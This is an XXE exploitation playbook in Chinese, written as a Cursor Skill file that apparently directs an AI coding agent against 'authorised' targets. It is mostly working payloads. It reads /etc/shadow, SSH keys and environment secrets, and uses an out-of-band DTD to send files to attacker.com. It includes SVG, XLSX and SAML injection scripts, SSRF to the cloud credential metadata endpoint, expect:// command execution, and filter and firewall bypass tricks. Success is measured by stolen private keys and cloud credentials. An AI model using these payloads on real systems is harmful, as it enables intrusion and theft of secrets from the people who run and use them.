---
name: 噬文
description: >-
 授权目标上 XML 外部实体注入（XXE）利用：经典文件读、带外 XXE（OOB）、
 盲 XXE via DTD、SSRF 升级、XXE → RCE（Expect 模块）、
 SVG/XLSX/DOCX/SAML 里的 XXE。
 文件读走 lfi-rfi-exploit；SSRF 升级走 ssrf-*。
---

# XML 外部实体注入（XXE）利用（Cursor Skill）

## 作业入口（先跑这个）

```bash
python3 炼蛊房/tpl_inject_probe.py xxe --url https://授权/api/import --case <案>
```

作业手法：`传承/噬文.md`。下面长文当附录。

## 何时用

- 请求/响应含 XML（Content-Type: application/xml、text/xml）
- 文件上传支持 SVG、XLSX、DOCX、ODT、RSS/Atom
- SAML SSO 登录（XML 签名请求）
- GraphQL / REST API 接受 XML body
- Java 应用（SAXParser/DocumentBuilder 默认开启外部实体）

---

## 1. 基础：经典文件读（in-band）

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
 <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### 常用文件路径

```
# Linux 系统信息
/etc/passwd
/etc/shadow (权限)
/etc/hostname
/proc/self/environ (环境变量 → TOKEN/SECRET)
/proc/self/cmdline (进程命令行)
/proc/self/cwd (当前目录 → 路径发现)
/proc/net/tcp (监听端口)

# Java 应用
/etc/hosts
/app/WEB-INF/web.xml
/app/application.properties
/app/application.yml
/app/config/application.yml

# PHP 应用
/var/www/html/config.php
/var/www/html/.env

# 通用
/root/.ssh/id_rsa
/home/$USER/.ssh/authorized_keys
```

---

## 2. PHP Filter Base64 绕过（特殊字符截断）

当 `/etc/passwd` 可读但源码文件含特殊字符时，用 PHP 过滤器 base64 编码：

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
 <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<root>&xxe;</root>
```

然后 `echo '<base64_result>' | base64 -d` 解码。

---

## 3. OOB 带外（Blind XXE）

目标无回显时，把内容外带到攻击者服务器：

**Step 1：在攻击者服务器放 DTD**（`https://attacker.com/evil.dtd`）：

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://attacker.com/collect?data=%file;'>">
%eval;
%exfil;
```

**Step 2：目标发送的 XML payload：**

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
 <!ENTITY % remote SYSTEM "https://attacker.com/evil.dtd">
 %remote;
]>
<root>trigger</root>
```

**接收端（攻击者服务器）：**

```bash
# 简单 netcat 监听
nc -lvp 80 | grep -o "data=.*"

# 或用 interactsh 自动化
interactsh-client -v
# 把 attacker.com 替换为 xxx.oast.fun
```

---

## 4. SVG 文件上传 XXE

许多应用允许上传 SVG 图像，服务端渲染时触发 XXE：

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
 <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
 <text x="0" y="15">&xxe;</text>
</svg>
```

```bash
# 上传并查看渲染结果（常在 <text> 标签内或图像中）
curl -s -F "file=@evil.svg" -F "type=image" https://目标/api/upload
```

---

## 5. XLSX/DOCX 里的 XXE

XLSX/DOCX 是 ZIP + XML，可直接修改内部 XML 文件：

```bash
# 解压 XLSX
unzip template.xlsx -d xlsx_dir

# 修改 xlsx_dir/xl/workbook.xml 或 sharedStrings.xml
# 在顶部加入 DOCTYPE：
cat > /tmp/inject.py << 'EOF'
import zipfile, shutil, os

shutil.copy("template.xlsx", "evil.xlsx")
# 读取 sharedStrings.xml
with zipfile.ZipFile("evil.xlsx", "r") as z:
 content = z.read("xl/sharedStrings.xml").decode()

# 注入 XXE
xxe_header = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
'''
content = content.replace('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>', 
 xxe_header + '<foo>&xxe;</foo>\n<!--')

# 写回
import io
buf = io.BytesIO()
with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zout:
 with zipfile.ZipFile("template.xlsx", "r") as zin:
 for item in zin.infolist():
 if item.filename == "xl/sharedStrings.xml":
 zout.writestr(item, content.encode())
 else:
 zout.writestr(item, zin.read(item.filename))
with open("evil.xlsx", "wb") as f:
 f.write(buf.getvalue())
print("生成 evil.xlsx")
EOF
python3 /tmp/inject.py
```

---

## 6. SAML XXE

SAML Response 是 Base64 编码的 XML，常可注入 XXE：

```bash
# 拦截 SAML 响应，base64 解码
echo 'PHNhbWx...' | base64 -d > saml_response.xml

# 在 XML 顶部注入 DOCTYPE
# 修改后重新 base64 编码并提交
cat > inject_saml.py << 'EOF'
import base64, sys

original = base64.b64decode(sys.argv[1]).decode()
xxe_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE samlp:Response [
 <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
"""
# 替换 XML 声明行
modified = original.replace('<?xml version="1.0" encoding="UTF-8"?>', xxe_payload, 1)
print(base64.b64encode(modified.encode()).decode())
EOF
python3 inject_saml.py "$SAML_RESPONSE_B64"
```

---

## 7. XXE → SSRF

可用 `http://` 协议把 XXE 变为 SSRF：

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
 <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<root>&xxe;</root>
```

```xml
<!-- 扫内网端口（延时/响应内容差分）-->
<!ENTITY xxe SYSTEM "http://192.168.1.1:8080/">
```

---

## 8. XXE → RCE（PHP expect）

PHP 开启 `expect` 扩展时：

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
 <!ENTITY xxe SYSTEM "expect://id">
]>
<root>&xxe;</root>
```

---

## 9. 自动化扫描

```bash
# Dalfox 不适用；用 XXEInjector
git clone https://github.com/enjoiz/XXEinjector
ruby XXEinjector.rb --host=<attacker_IP> --httpport=80 \
 --file=request.txt --path=/etc/passwd --oob=http --phpfilter

# 或用 nuclei XXE 模板
python3 tools/1day-kit/od_kit.py nuclei --url https://目标 \
 --case <案卷> --tags xxe
```

---

## 10. 防御绕过技巧

| 场景 | 绕过 |
|------|------|
| 关键字过滤 `ENTITY` | 用 `&#x45;&#x4e;&#x54;&#x49;&#x54;&#x59;` 十六进制编码 |
| 关键字过滤 `DOCTYPE` | UTF-7/UTF-16 编码整个 payload |
| 空格过滤 | 用 `&#x9;`（tab）替换空格 |
| 服务器只接受 JSON | 改 Content-Type: application/xml 尝试（部分 Java 框架忽略） |
| 防火墙过滤出网请求 | 用 DNS OOB 替代 HTTP（`file:///etc/passwd` → `%file;.attacker.com` 子域 DNS） |

---

## 11. 成功口径

| 级别 | 描述 |
|------|------|
| L1 | 确认解析器开启外部实体（错误响应泄露路径/堆栈） |
| L2 | 成功读取 `/etc/passwd` 或 `.env`/`application.yml` |
| L3 | 读取私钥、数据库凭据、云 AK，或通过 SSRF 访问内网服务 |

---

## 真源

- 手法：`传承/噬文.md`
- 工具：`python3 炼蛊房/tpl_inject_probe.py xxe --help`
- 配合：`ssrf-testing` · `ssrf_probe.py`（XXE 升 SSRF 内网打点）
